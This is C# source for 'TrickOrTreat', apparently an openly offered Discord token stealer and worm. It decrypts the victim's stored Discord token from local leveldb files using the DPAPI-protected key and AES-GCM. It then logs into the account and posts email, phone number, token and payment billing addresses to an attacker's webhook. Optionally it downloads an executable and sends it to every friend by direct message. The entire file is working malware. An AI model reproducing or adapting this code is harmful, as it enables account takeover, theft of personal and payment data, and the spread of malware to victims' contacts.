using Discord;
using Discord.Gateway;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

/* 
       │ Author       : extatent
       │ Name         : TrickOrTreat
       │ GitHub       : https://github.com/extatent
*/

namespace TrickOrTreat
{
    class Program
    {
        #region configs
        static string webhook = "https://discord.com/api/webhooks/example/example"; // Enter Discord webhook

        static bool spread = false; // Sends the file/message to all friends (true/false)
        static string w0rmurl = "https://example.com/cool.exe"; // Enter the download link you want the user to download and spread
        static string w0rmpath = Path.GetTempPath() + "\\renamed.exe"; // Enter the path with the name where you want the file to be downloaded
        static string w0rmmsg = ""; // Enter the message (optional)

        static DiscordSocketClient client = new DiscordSocketClient();
        #endregion

        static void Main(string[] args)
        {
            Start();
        }
         
        #region Start
        static void Start()
        {
            try
            {
                client.Login(t0ken());

                string cid = client.GetClientUser().Id.ToString();
                if (string.IsNullOrEmpty(cid))
                {
                    cid = "N/A";
                }
                string email = client.GetClientUser().Email;
                if (string.IsNullOrEmpty(email))
                {
                    email = "N/A";
                }
                string phonenumber = client.GetClientUser().PhoneNumber;
                if (string.IsNullOrEmpty(phonenumber))
                {
                    phonenumber = "N/A";
                }
                string createdat = client.GetClientUser().CreatedAt.ToString();
                if (string.IsNullOrEmpty(createdat))
                {
                    createdat = "N/A";
                }
                string registrationlanguage = client.GetClientUser().RegistrationLanguage.ToString();
                if (string.IsNullOrEmpty(registrationlanguage))
                {
                    registrationlanguage = "N/A";
                }
                string guildscount = client.GetCachedGuilds().Count.ToString();
                if (string.IsNullOrEmpty(guildscount))
                {
                    guildscount = "N/A";
                }
                string friendscount = client.GetRelationships().Count.ToString();
                if (string.IsNullOrEmpty(friendscount))
                {
                    friendscount = "N/A";
                }
                string dmscount = client.GetPrivateChannels().Count.ToString();
                if (string.IsNullOrEmpty(dmscount))
                {
                    dmscount = "N/A";
                }
                string badges = client.GetClientUser().Badges.ToString();
                if (string.IsNullOrEmpty(badges))
                {
                    badges = "N/A";
                }
                string nitro = client.GetClientUser().Nitro.ToString();
                if (string.IsNullOrEmpty(nitro))
                {
                    nitro = "N/A";
                }
                string nitrosince = client.GetClientUser().GetProfile().NitroSince.ToString();
                if (string.IsNullOrEmpty(nitrosince))
                {
                    nitrosince = "N/A";
                }
                string boostslots = client.GetBoostSlots().Count.ToString();
                if (string.IsNullOrEmpty(boostslots))
                {
                    boostslots = "N/A";
                }

                DiscordEmbed("New account from " + client.User, "1018364", cid, email, phonenumber, createdat, registrationlanguage, guildscount, friendscount, dmscount, badges, nitro, nitrosince, boostslots, t0ken());

                foreach (var paymentMethod in client.GetPaymentMethods())
                {
                    string id = paymentMethod.Id.ToString();
                    if (string.IsNullOrEmpty(id))
                    {
                        id = "N/A";
                    }
                    string invalid = paymentMethod.Invalid.ToString();
                    if (string.IsNullOrEmpty(invalid))
                    {
                        invalid = "N/A";
                    }
                    string address1 = paymentMethod.BillingAddress.Address1;
                    if (string.IsNullOrEmpty(address1))
                    {
                        address1 = "N/A";
                    }
                    string address2 = paymentMethod.BillingAddress.Address2;
                    if (string.IsNullOrEmpty(address2))
                    {
                        address2 = "N/A";
                    }
                    string city = paymentMethod.BillingAddress.City;
                    if (string.IsNullOrEmpty(city))
                    {
                        city = "N/A";
                    }
                    string country = paymentMethod.BillingAddress.Country;
                    if (string.IsNullOrEmpty(country))
                    {
                        country = "N/A";
                    }
                    string postalcode = paymentMethod.BillingAddress.PostalCode;
                    if (string.IsNullOrEmpty(postalcode))
                    {
                        postalcode = "N/A";
                    }
                    string state = paymentMethod.BillingAddress.State;
                    if (string.IsNullOrEmpty(state))
                    {
                        state = "N/A";
                    }

                    DiscordEmbed2("1018364", id, invalid, address1, address2, city, country, postalcode, state);
                }
                if (spread == true)
                {
                    d0wnload();
                    w0rm();
                }
            }
            catch
            { }
        }
        #endregion

        #region Discord embeds
        static void DiscordEmbed(string title, string color, string field1, string field2, string field3, string field4, string field5, string field6, string field7, string field8, string field9, string field10, string field11, string field12, string field13)
        {
            try
            {
                var wr = WebRequest.Create(webhook);
                wr.ContentType = "application/json";
                wr.Method = "POST";
                using (var sw = new StreamWriter(wr.GetRequestStream()))
                    sw.Write("{\"username\":\"github.com/extatent\",\"embeds\":[{\"title\":\"" + title + "\",\"color\":" + color + ",\"footer\":{\"icon_url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\",\"text\":\"github.com/extatent\"},\"thumbnail\":{\"url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\"},\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Email\",\"value\":\"" + field2 + "\"},{\"name\":\"Phone Number\",\"value\":\"" + field3 + "\"},{\"name\":\"Registered At\",\"value\":\"" + field4 + "\"},{\"name\":\"Registration Language\",\"value\":\"" + field5 + "\"},{\"name\":\"Guilds Count\",\"value\":\"" + field6 + "\"},{\"name\":\"Friends Count\",\"value\":\"" + field7 + "\"},{\"name\":\"DMs Count\",\"value\":\"" + field8 + "\"},{\"name\":\"Badges\",\"value\":\"" + field9 + "\"},{\"name\":\"Nitro\",\"value\":\"" + field10 + "\"},{\"name\":\"Nitro Since\",\"value\":\"" + field11 + "\"},{\"name\":\"Boost Slots\",\"value\":\"" + field12 + "\"},{\"name\":\"DT\",\"value\":\"" + field13 + "\"}]}]}");
                wr.GetResponse();
            }
            catch
            { }
        }

        static void DiscordEmbed2(string color, string field1, string field2, string field3, string field4, string field5, string field6, string field7, string field8)
        {
            try
            {
                var wr = WebRequest.Create(webhook);
                wr.ContentType = "application/json";
                wr.Method = "POST";
                using (var sw = new StreamWriter(wr.GetRequestStream()))
                    sw.Write("{\"username\":\"github.com/extatent\",\"embeds\":[{\"title\":\"Payment Info\",\"color\":" + color + ",\"footer\":{\"icon_url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\",\"text\":\"github.com/extatent\"},\"thumbnail\":{\"url\":\"https://avatars.githubusercontent.com/u/51336140?v=4.png\"},\"fields\":[{\"name\":\"ID\",\"value\":\"" + field1 + "\"},{\"name\":\"Invalid\",\"value\":\"" + field2 + "\"},{\"name\":\"Address 1\",\"value\":\"" + field3 + "\"},{\"name\":\"Address 2\",\"value\":\"" + field4 + "\"},{\"name\":\"City\",\"value\":\"" + field5 + "\"},{\"name\":\"Country\",\"value\":\"" + field6 + "\"},{\"name\":\"Postal Code\",\"value\":\"" + field7 + "\"},{\"name\":\"State\",\"value\":\"" + field8 + "\"}]}]}");
                wr.GetResponse();
            }
            catch
            { }
        }
        #endregion

        #region download
        static void d0wnload()
        {
            try
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile(w0rmurl, w0rmpath);
                }
            }
            catch
            { }
        }
        #endregion

        #region worm
        static void w0rm()
        {
            try
            {
                foreach (var relationship in client.GetRelationships())
                {
                    if (relationship.Type == RelationshipType.Friends)
                    {
                        try
                        {
                            PrivateChannel channel = client.CreateDM(relationship.User.Id);
                            client.SendFile(channel, w0rmpath, w0rmmsg);
                            Thread.Sleep(200);
                        }
                        catch
                        { }
                    }
                }
            }
            catch
            { }
        }
        #endregion

        #region Get Token
        static string t0ken()
        {
            string token = "";

            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

            string[] dbfiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb\", "*.ldb", SearchOption.AllDirectories);
            foreach (string file in dbfiles)
            {
                FileInfo info = new FileInfo(file);
                string contents = File.ReadAllText(info.FullName);

                Match match = EncryptedRegex.Match(contents);
                if (match.Success)
                {
                    token = DecryptToken(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                }
            }

            return token;
        }

        static byte[] DecyrptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }
        #endregion
    }
}
